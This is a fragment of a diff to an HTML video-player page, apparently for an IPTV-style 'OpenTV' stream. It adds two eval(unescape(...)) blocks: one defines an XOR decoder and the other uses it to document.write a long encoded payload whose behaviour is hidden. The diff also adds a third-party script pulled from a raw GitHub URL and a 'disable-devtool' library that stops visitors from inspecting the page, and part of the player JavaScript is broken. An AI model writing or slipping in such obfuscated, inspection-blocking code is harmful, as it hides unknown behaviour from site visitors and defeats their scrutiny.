68%67%67%6a%4d%2b%40%57%27%2e%2a%21%32%02%06%73%1a%1a%01%03%00%01%63%6f%6a%5a%6b%61%6d%68%1a%6b%62%64%6f%4e%2d%45%57%27%6f%61%63%6a%3a%74%24%1f%76%07%06%1d%1f%18%1e%6a%66%5d%74%58%69%2b%5d%6d%6b%69%5d%6c%6e%4e%65%60%58%27%69%66%59%74%5a%6e%2c%5d%6f%6a%6b%58%6d%6d%4e%61%60%5a%20%27%1a%25%1c%6a%62%66%69%3c%71%24%30%05%00%77%07%02%31%2e%68%5e%6c%61%6d%6b%3a%03%04%07%02%31%6a%58%6f%63%68%69%1f%5c%67%6d%5b%5a%61%58%22%5d%5f%72%69%6c%6b%62%27%5b%69%69%6e%1f%6e%6c%5f%30%19%60%6a%6e%6a%6b%33%2e%2c%5e%5e%6a%2f%61%6f%5a%5f%66%65%77%6b%2d%6b%5f%6c%2e%6d%68%63%29%5e%65%6a%5c%59%65%5f%25%59%5a%72%6a%69%69%60%3d%61%5e%6d%5f%6f%69%19%3a%32%29%6d%5b%6b%64%6f%6d%38%05%03%33%6f%59%6c%63%6c%69%3f%02%07%1a%18%1d%1f%3c%67%6d%5b%5a%61%58%3b%5c%70%6c%6e%6c%64%26%75%07%02%1d%1d%1f%19%1a%18%1d%1f%6b%6c%5e%5f%76%69%6e%6c%65%69%68%58%6d%36%1e%22%6e%75%6d%58%26%19%37%3a%1d%70%05%00%1a%1a%1c%1d%1d%1f%19%1a%18%1d%1f%18%59%69%68%6b%69%1d%66%6b%60%6b%1d%32%18%25%5e%5f%76%69%6e%6c%65%1a%6b%6d%5a%6a%5b%5e%1b%33%1d%69%76%69%5f%18%30%24%18%21%1a%6e%75%6d%58%30%04%04%18%1d%1f%18%1e%1a%1a%1c%1d%1d%1f%19%5b%64%58%69%6c%26%63%68%66%6e%24%30%19%29%2b%1d%46%62%1e%73%69%69%1d%5c%69%5c%1a%73%6e%69%6e%67%5f%5e%1c%5c%5b%6c%6c%6e%18%5b%63%6b%59%65%63%6e%66%1d%6b%61%5f%18%6d%5e%63%5b%26%1a%69%6a%58%1f%5e%69%6a%6a%6c%64%5b%28%71%5d%6b%6f%27%60%68%62%6e%26%37%1e%5b%68%58%1d%6e%6f%5c%68%18%69%67%5d%1e%5d%69%6e%6a%6e%63%5c%1a%6c%6e%1f%72%67%5f%71%01%03%1d%1f%19%1a%18%1d%1f%18%73%26%07%02%1d%1d%1f%19%77%21%00%01%34%2d%6d%5d%6a%64%6d%6b%3b%07%06%31%68%5f%68%63%6a%68%3f%00%01%2a%29%18%40%5a%6a%5a%5b%6a%5d%69%62%5e%6b%1a%4d%4b%43%18%69%5b%5b%68%1d%64%6d%60%07%06%77%5e%6e%1e%5d%6f%6a%6b%58%6d%6d%4f%6e%61%1f%35%1e%71%63%6e%59%6e%74%2b%66%6b%5a%5e%6c%67%69%68%2e%65%6b%5a%63%35%05%03%02%06%2d%29%1a%41%58%6f%64%5c%5d%5d%62%1f%59%6e%5b%65%5d%65%1d%4a%4f%46%18%60%5a%6a%65%5b%68%58%68%6f%64%19%6a%59%6b%5e%65%5b%6e%5f%6a%1d%1b%75%60%5f%73%20%68%6b%6b%6c%5d%59%33%1b%02%07%63%62%1d%27%5f%6b%6c%6c%59%6f%69%4a%6f%66%2a%64%6d%5f%62%6f%5e%59%6a%25%19%73%63%5d%76%22%6f%6d%6f%6c%5b%58%33%19%20%23%18%72%02%06%1e%1a%29%2f%1d%40%5a%6b%61%59%61%66%60%61%5b%68%1c%6d%58%6d%62%61%6d%6f%5e%18%61%5f%1a%64%5c%61%5e%64%5b%6a%1d%59%5d%68%5b%68%58%5c%00%01%19%1a%73%64%6d%5c%6d%71%28%60%6e%5a%5e%6d%63%6b%6f%2d%60%68%5f%60%1c%30%1d%19%61%6e%6c%6d%68%36%2d%29%5b%65%6d%61%6a%6e%28%68%5c%64%5d%69%28%5e%59%77%2e%19%36%07%06%70%02%06%32%29%6d%5b%6b%64%6f%6d%38%05%03%33%2b%5a%63%70%3e21648406%36%37%37%35%33%30%32' + unescape('%27%29%29%3b'));
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6b%62%30%36%64%31%39%36%64%36%37%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%38%31%37%32%36%32%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%39%33%34%30%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6b%62%30%36%64%31%39%36%64%36%37%28%27') + '%45%7d%6e%77%66%7d%7f%4b%1b%0c%6c%74%70%7c%7c%23%75%79%6e%78%62%7e%26%46%25%78%6a%6c%6c%74%67%70%2b%24%72%6c%7c%75%72%62%7b%6c%77%24%26%46%1a%06%72%6e%79%26%75%71%60%69%5c%7f%68%64%67%70%62%71%26%46%20%73%71%6e%76%6c%7f%3a%7a%6e%68%6e%60%36%7b%6d%7f%3b%77%7c%6f%6a%44%12%0c%71%74%60%7e%62%7f%35%71%63%6b%69%64%30%79%68%71%33%79%7c%60%61%2c%41%21%6b%79%77%6d%7f%6e%7c%7b%2b%26%2c%83%16%0f%26%21%7c%6b%6e%70%3b%7e%62%70%54%6e%76%79%6e%7d%7f%4d%62%6e%6f%62%7e%2e%28%57%69%6f%6f%71%6a%7f%24%37%2d%25%6e%7d%79%76%7c%3a%32%34%74%74%7a%3b%62%6d%73%78%7a%76%6f%6f%6e%6e%3b%6e%7c%7b%37%28%2e%43%21%17%09%25%2d%71%6b%66%71%30%7c%6a%7a%53%6f%70%7a%62%70%7f%45%63%65%6d%6a%74%29%29%5c%78%62%7f%34%4e%65%69%77%79%2f%35%20%2a%52%7c%77%68%79%78%65%30%3a%30%31%20%2b%51%66%7b%7c%75%49%26%42%73%6a%73%71%68%69%2d%3e%31%48%2c%5b%56%32%4f%3a%3b%3b%47%2d%4f%7c%66%78%6a%30%58%53%52%33%40%33%3f%3f%33%34%3e%36%37%35%36%32%2b%23%46%7d%7d%77%62%55%69%63%50%6d%7d%31%3c%38%34%3b%3e%33%2c%2e%54%4d%5a%56%54%37%25%79%66%76%62%2c%4f%6e%68%73%70%2b%23%48%65%7f%72%7a%63%37%32%35%3b%37%30%35%3a%3d%33%33%3b%3f%35%3d%25%51%70%62%68%71%62%2d%5e%6e%62%65%73%6e%37%3e%3d%3a%33%30%33%2a%26%49%11%0b%25%26%7d%68%68%78%3b%70%6c%71%5e%69%72%7a%69%7c%7c%4b%6a%6e%61%6c%7f%24%2f%4c%74%77%74%6b%6c%2c%39%2d%2a%63%67%74%7c%79%71%6e%6c%68%66%75%6c%7f%7c%79%69%77%42%69%7a%4a%6b%67%44%60%68%5c%67%4c%4a%5a%7c%4a%33%55%6e%46%70%48%7b%5e%39%6c%48%4d%3f%4b%76%75%55%53%4e%47%37%30%6e%7e%4c%7b%6c%5a%4e%66%5c%68%46%74%51%6b%52%36%57%5c%58%38%5c%41%76%74%47%6d%78%6e%64%76%4e%7f%5f%50%46%3d%46%79%76%7f%66%4f%3d%69%51%4c%36%79%48%66%75%6d%62%5c%48%31%4b%69%74%75%5b%5f%42%3e%51%6b%52%39%56%4c%48%7e%63%5e%35%50%62%72%54%7d%7f%53%4a%5e%52%62%58%56%43%3e%55%5d%39%68%78%70%54%6a%47%63%3e%33%5c%57%74%3b%7d%4b%5e%62%66%61%5e%7e%70%75%39%6c%40%26%6e%78%73%6e%7f%62%7e%4a%55%69%6d%31%26%31%39%34%4f%6e%7b%34%3f%3c%34%3e%25%36%3e%3a%3e%35%37%3d%33%2d%45%51%5d%40%26%56%63%7b%32%4e%64%6c%4a%31%35%3e%38%38%31%30%33%40%2d%5d%60%71%64%41%30%40%26%5c%63%74%6a%50%66%7f%62%4b%52%62%7d%2f%2a%45%23%12%07%2d%23%7f%63%7a%7e%77%70%21%74%72%66%61%5c%71%66%65%6d%77%66%72%37%63%73%75%79%76%2b%71%64%6d%7c%31%26%62%72%6a%7a%7a%62%75%71%71%2d%44%12%0c%86%17%09%75%79%6e%78%62%7e%30%73%6a%65%6d%7b%2b%2d%26%2d%44%4b%2c%83%16%0f%26%21%70%77%66%76%62%71%3b%7c%72%62%7e%2e%2a%45%14%0f%8a%26%46%1a%06%26%21%41%37%7c%6d%71%6e%7d%71%45%1a%06%42%7f%6e%6a%6e%71%23%6e%61%4a%21%73%66%7b%71%71%65%7a%6f%71%27%2d%60%77%6e%71%7b%46%27%78%6a%6c%6c%74%3a%67%7e%2d%72%6c%7c%32%6a%6e%6e%60%7a%79%71%34%70%79%6d%77%27%26%7c%7c%78%71%62%4a%21%74%67%6a%7d%6d%3c%32%30%33%2a%48%65%6c%66%65%6e%7d%3f%35%31%30%2c%40%71%62%7b%71%3b%65%75%6e%6f%77%3a%6e%6a%7b%71%6c%7f%49%24%21%7c%6d%6d%7c%6b%42%2f%3e%33%3d%23%24%21%6d%69%6a%69%6b%79%4a%2f%30%3d%3c%29%23%25%6b%70%76%7f%77%7c%79%7e%4a%2e%7a%73%7a%69%23%20%73%74%70%71%6c%7f%4b%24%69%79%7a%71%7d%39%34%3c%7c%73%62%7a%7a%7f%33%76%62%69%6c%78%3b%61%6c%73%3d%64%62%73%70%6e%72%35%7c%62%6f%73%2f%2c%65%7e%79%77%71%74%60%7e%2d%60%72%7b%70%74%70%71%7b%21%70%71%6a%79%7c%60%61%4b%24%62%7a%7a%70%22%23%75%79%6e%78%70%67%70%75%6e%70%6e%46%14%0f%06%06%47%70%7d%79%73%68%69%21%7d%71%68%4a%2f%6b%71%70%76%7c%3f%37%30%7e%72%69%3b%79%68%7b%79%70%6e%79%77%7d%7c%35%78%74%66%6d%71%61%77%77%79%69%77%7c%35%68%7c%7a%32%40%7d%70%7d%6a%70%7d%31%4b%51%50%3c%57%66%72%69%30%48%6e%62%76%75%6a%79%22%31%35%61%6e%3c%3d%3d%2e%32%38%34%66%7b%6f%62%74%30%76%38%79%39%22%23%79%76%7d%6c%4a%25%65%71%75%72%6a%6d%60%79%66%7c%75%3c%72%70%6d%33%65%71%70%77%6a%3b%7a%73%62%65%79%73%71%2f%47%17%09%25%2d%2d%47%3c%72%6d%6d%6a%77%47%44%32%69%66%73%45%49%3d%6a%6a%7b%408172623%34%35%36%30%38%38%36' + unescape('%27%29%29%3b'));
 // -->
 </script>
+   
+<script src='https://vjs.zencdn.net/5-unsafe/video.js'></script>
+<script src='https://raw.githubusercontent.com/Playtekno/opentv/main/js/smooth_tech.js'></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
+<script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
+<script src="https://use.fontawesome.com/f4da8251b8.js"></script>
+<script src="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.js"></script>  
+
+<script>
+    (function(window, videojs) {
+      var examplePlayer = window.examplePlayer = videojs('vjsplayer');
+player.smoothTech();
+    }(window, window.videojs));
+	plugins: {
+			videoJsResolutionSwitcher: {
+			    ui: true,
+				default: 'mid',
+				dynamicLabel: false
+			}
+		}
+	}, function(){
+		var player = this;
+		player.on('resolutionchange', function(){
+			console.info('Source changed')
+});
+  </script>
+<script>
+videojs('vjsplayer').videoJsResolutionSwitcher()
+</script>
+<script>
+var player = videojs('vjsplayer');
+
+var skipBehindButton = player.controlBar.addChild("button");
+var skipBehindButtonDom = skipBehindButton.el();
+skipBehindButtonDom.innerHTML = "OpenTV";
+skipBehindButton.addClass("buttonClass");
+    
+skipBehindButtonDom.onclick = function(){
+    skipS3MV(-30);
+}  
+
+var skipAheadButton = player.controlBar.addChild("button");
+var skipAheadButtonDom = skipAheadButton.el();
+skipAheadButtonDom.innerHTML = "";
+skipAheadButton.addClass("buttonClass");
+    
+skipAheadButtonDom.onclick = function(){
+    skipS3MV(30);
+}  
+
+function skipS3MV(skipBy) {
+    player.currentTime(player.currentTime() + skipBy);
+}
+</script>
+
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script>
+    DisableDevtool({
+        ondevtoolopen: (type) => {
+            const info = 'devtool opened!; type =' + type;
+            alert(info); // If you are worried about blocking the page, use console.warn(info); and open the console to view
+        },
+    })
+</script>
+</div>
 </BODY></HTML>
